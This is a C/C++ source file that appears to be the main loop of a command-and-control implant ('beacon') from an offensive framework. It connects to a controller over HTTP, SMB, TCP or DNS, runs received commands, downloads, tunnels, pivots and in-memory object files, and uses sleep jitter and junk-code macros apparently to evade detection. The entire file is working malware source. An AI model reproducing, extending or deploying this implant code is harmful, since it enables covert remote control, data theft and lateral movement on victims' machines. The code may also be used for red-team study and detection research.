#include "main.h"
#include "ApiLoader.h"
#include "DynamicPolymorphism.h"
#include "Commander.h"
#include "utils.h"
#include "Crypt.h"
#include "WaitMask.h"
#include "Boffer.h"
#include "Connector.h"

#if defined(BEACON_HTTP)
#include "ConnectorHTTP.h"
#elif defined(BEACON_SMB)
#include "ConnectorSMB.h"
#elif defined(BEACON_TCP)
#include "ConnectorTCP.h"
#elif defined(BEACON_DNS)
#include "ConnectorDNS.h"
#endif

Agent* g_Agent;
Connector* g_Connector;

Connector* CreateConnectorHTTP();
Connector* CreateConnectorSMB();
Connector* CreateConnectorTCP();
Connector* CreateConnectorDNS();

static Connector* CreateConnector()
{
#if defined(BEACON_HTTP)
	return CreateConnectorHTTP();
#elif defined(BEACON_SMB)
	return CreateConnectorSMB();
#elif defined(BEACON_TCP)
	return CreateConnectorTCP();
#elif defined(BEACON_DNS)
	return CreateConnectorDNS();
#endif
}

DWORD WINAPI AgentMain(LPVOID lpParam)
{
	AX_JUNK_1;
	if (!ApiLoad())
		return 0;

	g_Agent = Agent_Create();
	g_Connector = CreateConnector();

	g_AsyncBofManager = Boffer_Create();
	Boffer_Initialize(g_AsyncBofManager);

	ULONG beatSize = 0;
	BYTE* beat = Agent_BuildBeat(g_Agent, &beatSize);
	if (!beat || beatSize == 0)
		return 0;

	if (!g_Connector->SetProfile(g_Connector, &g_Agent->config->profile, beat, beatSize))
		return 0;

	MemFreeLocal((LPVOID*)&beat, beatSize);

	Packer* packerOut = Packer_Create();
	Packer_Pack32(packerOut, 0);

	do {
		AX_JUNK_2;
		if (!g_Connector->WaitForConnection(g_Connector))
			continue;

		do {
			AX_JUNK_3;
			if (Packer_datasize(packerOut) > 4) {
				Packer_Set32(packerOut, 0, Packer_datasize(packerOut));
				g_Connector->Exchange(g_Connector, Packer_data(packerOut), Packer_datasize(packerOut), g_Agent->SessionKey);
				Packer_Clear(packerOut, TRUE);
				Packer_Pack32(packerOut, 0);
			}
			else {
				g_Connector->Exchange(g_Connector, nullptr, 0, g_Agent->SessionKey);
			}

			{
				BYTE* recvBuf = g_Connector->RecvData(g_Connector);
				int   recvLen = g_Connector->RecvSize(g_Connector);
				if (recvLen > 0 && recvBuf)
					Commander_ProcessCommandTasks(g_Agent->commander, recvBuf, recvLen, packerOut);
			}
			g_Connector->RecvClear(g_Connector);

			Downloader_ProcessDownloader(g_Agent->downloader, packerOut);
			JobsController_ProcessJobs(g_Agent->jober, packerOut);
			Proxyfire_ProcessTunnels(g_Agent->proxyfire, packerOut);
			Pivotter_ProcessPivots(g_Agent->pivotter, packerOut);
			Boffer_ProcessAsyncBofs(g_AsyncBofManager, packerOut);

			if (Agent_IsActive(g_Agent)) {
				const BOOL hasOutput = (Packer_datasize(packerOut) >= 8);
				g_Connector->Sleep(g_Connector, Boffer_GetWakeupEvent(g_AsyncBofManager), Agent_GetWorkingSleep(g_Agent), g_Agent->config->sleep_delay, g_Agent->config->jitter_delay, hasOutput);
			}

		} while (g_Connector->IsConnected(g_Connector) && Agent_IsActive(g_Agent));

		if (!Agent_IsActive(g_Agent) && g_Connector->IsConnected(g_Connector)) {
			Commander_Exit(g_Agent->commander, packerOut);
			Packer_Set32(packerOut, 0, Packer_datasize(packerOut));
			g_Connector->Exchange(g_Connector, Packer_data(packerOut), Packer_datasize(packerOut), g_Agent->SessionKey);
			g_Connector->RecvClear(g_Connector);
		}

		g_Connector->Disconnect(g_Connector);

	} while (Agent_IsActive(g_Agent));

	Packer_Clear(packerOut, FALSE);
	Packer_Destroy(packerOut);

	g_Connector->CloseConnector(g_Connector);
	AgentExit(g_Agent->config->exit_method);
	return 0;
}

void AgentExit(const int method)
{
	if (method == 1)
		ApiNt->RtlExitUserThread(STATUS_SUCCESS);
	else if (method == 2)
		ApiNt->RtlExitUserProcess(STATUS_SUCCESS);
}
